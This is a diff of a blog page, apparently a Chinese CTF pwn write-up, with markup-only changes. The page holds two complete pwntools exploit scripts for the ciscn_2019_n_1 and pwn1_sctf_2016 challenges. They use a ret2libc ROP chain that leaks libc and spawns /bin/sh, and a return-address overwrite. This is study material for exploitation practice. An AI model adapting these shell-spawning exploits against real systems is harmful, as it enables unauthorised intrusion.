@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
-<head><meta name="generator" content="Hexo 3.8.0">
+<head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
@@ -49,7 +49,7 @@
 <div class="nav" id="nav">
     <div class="avatar-name">
         <div class="avatar">
-            <img src="/img/avatar.jpg">
+            <img src="/img/avatar.jpg" />
         </div>
         <div class="name">
             <i>monitor</i>
@@ -57,25 +57,25 @@
     </div>
     <div class="contents" id="nav-content">
         <ul>
-            <li>
+            <li >
                 <a href="/">
                     <i class="iconfont icon-shouye1"></i>
                     <span>Home</span>
                 </a>
             </li>
-            <li>
+            <li >
                 <a href="/tags">
                     <i class="iconfont icon-biaoqian1"></i>
                     <span>Tags</span>
                 </a>
             </li>
-            <li>
+            <li >
                 <a href="/archives">
                     <i class="iconfont icon-guidang2"></i>
                     <span>Archive</span>
                 </a>
             </li>
-            <li>
+            <li >
                 <a href="/about/">
                     <i class="iconfont icon-guanyu2"></i>
                     <span>About</span>
@@ -96,7 +96,7 @@
     <div class="search-container">
         <div class="search-input">
             <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
-            <input id="search-input">
+            <input id="search-input"/>
             <span id="begin-search">搜索</span>
         </div>
         <div class="search-result-container" id="search-result-container">
@@ -131,7 +131,7 @@
         </span>
         <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
 </span>
-
+</span>
     </div>
     <div class="post-content ">
         <h2 id="Pwn–stack-overflow"><a href="#Pwn–stack-overflow" class="headerlink" title="Pwn–stack_overflow"></a>Pwn–stack_overflow</h2><p>题目来源于：蒸米pwn/ctf-wiki</p>
@@ -159,7 +159,7 @@
 <h3 id="ciscn-2019-n-1-buu"><a href="#ciscn-2019-n-1-buu" class="headerlink" title="ciscn_2019_n_1(buu)"></a>ciscn_2019_n_1(buu)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = <span class="number">0</span></span><br><span class="line">vuln_addr = <span class="number">0x0000000000400676</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">()</span>:</span></span><br><span class="line">      <span class="keyword">global</span> puts_addr</span><br><span class="line">      elf = ELF(<span class="string">'./ciscn_2019_n_1'</span>)</span><br><span class="line">      puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">      puts_plt = elf.plt[<span class="string">'puts'</span>] + <span class="number">4</span></span><br><span class="line">      print(<span class="string">"puts_got = "</span> + hex(puts_got))</span><br><span class="line">      print(<span class="string">'puts_plt = '</span> + hex(puts_plt))</span><br><span class="line">      pop_rdi_addr = <span class="number">0x0000000000400793</span></span><br><span class="line">      payload1 = <span class="string">'a'</span> * <span class="number">56</span> + p64(pop_rdi_addr) + p64(puts_got) +p64(puts_plt)+p64(vuln_addr)</span><br><span class="line">      sh.recvuntil(<span class="string">"Let's guess the number."</span>)</span><br><span class="line">      sh.sendline(payload1)</span><br><span class="line">      <span class="comment"># puts_addr = u64(sh.recv(8))</span></span><br><span class="line">      <span class="comment"># print(sh.recv(8))</span></span><br><span class="line">      <span class="comment"># puts_addr = 0x7ffff7a649c0</span></span><br><span class="line">      sh.recvuntil(<span class="string">"Its value should be 11.28125"</span>)</span><br><span class="line">      <span class="comment"># sh.recv(10)</span></span><br><span class="line">      puts_addr = u64(sh.recv(<span class="number">8</span>))</span><br><span class="line">      puts_addr = hex(puts_addr)</span><br><span class="line">      puts_addr = str(puts_addr)</span><br><span class="line">      puts_addr = <span class="string">'0x'</span>+puts_addr[<span class="number">3</span>:<span class="number">15</span>]</span><br><span class="line">      puts_addr = int(puts_addr,<span class="number">0</span>)</span><br><span class="line">      <span class="comment"># puts_addr = hex(puts_addr)</span></span><br><span class="line">      print(<span class="string">"puts_addr = "</span> + hex(puts_addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">      libc = ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line">      libc_base_addr = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">      print(<span class="string">"libc_base_addr = "</span>+hex(libc_base_addr))</span><br><span class="line">      sys_addr = libc_base_addr + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">      print(<span class="string">"sys_addr = "</span> + hex(sys_addr))</span><br><span class="line">      str_bin_addr = libc_base_addr + next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line">      print(<span class="string">"str_bin_addr = "</span> + hex(str_bin_addr))</span><br><span class="line">      ret_addr = libc_base_addr + <span class="number">0x00000000000008aa</span></span><br><span class="line">      pop_rdi_addr = libc_base_addr + <span class="number">0x000000000002155f</span></span><br><span class="line">      payload2 = <span class="string">'a'</span> * <span class="number">56</span> + p64(pop_rdi_addr) + p64(str_bin_addr)  + p64(ret_addr) +p64(sys_addr)</span><br><span class="line">      sh.sendline(payload2)</span><br><span class="line">      sh.interactive()</span><br><span class="line">      </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(debug)</span>:</span></span><br><span class="line">      <span class="keyword">global</span> sh</span><br><span class="line">      <span class="keyword">if</span>(debug == <span class="number">1</span>):</span><br><span class="line">            sh = process(<span class="string">'./ciscn_2019_n_1'</span>)</span><br><span class="line">            context.arch = <span class="string">'amd64'</span></span><br><span class="line">            context.terminal = [<span class="string">'/bin/zsh'</span>]</span><br><span class="line">            context.log_level = <span class="string">'debug'</span></span><br><span class="line">            <span class="comment"># gdb.attach(sh,'')</span></span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">            sh = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29191</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">      debug(<span class="number">1</span>)</span><br><span class="line">      leak()</span><br><span class="line">      pwn()</span><br></pre></td></tr></table></figure>
 <h3 id="pwn1-sctf-2016-buu"><a href="#pwn1-sctf-2016-buu" class="headerlink" title="pwn1_sctf_2016(buu)"></a>pwn1_sctf_2016(buu)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(debug)</span>:</span></span><br><span class="line">	<span class="keyword">global</span> sh</span><br><span class="line">	<span class="keyword">if</span>(debug==<span class="number">1</span>):</span><br><span class="line">		context.log_level = <span class="string">'debug'</span></span><br><span class="line">		context.arch = <span class="string">'amd64'</span></span><br><span class="line">		context.terminal = [<span class="string">'/bin/zsh'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line">		sh = process(<span class="string">'./pwn1_sctf_2016'</span>)</span><br><span class="line">		gdb.attach(sh,<span class="string">''</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		sh = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">27821</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">	</span><br><span class="line">	ret_addr = <span class="number">0x08048F0D</span></span><br><span class="line">	payload = <span class="string">'I'</span>*<span class="number">21</span>+<span class="string">'a'</span>+p32(ret_addr)</span><br><span class="line">	<span class="comment"># sh.recvuntil('Tell me something about yourself:')</span></span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">	debug(<span class="number">1</span>)</span><br><span class="line">	pwn()</span><br></pre></td></tr></table></figure>
         
-        <br>
+        <br />
         <div id="comment-container">
         </div>
         <div id="disqus_thread"></div>
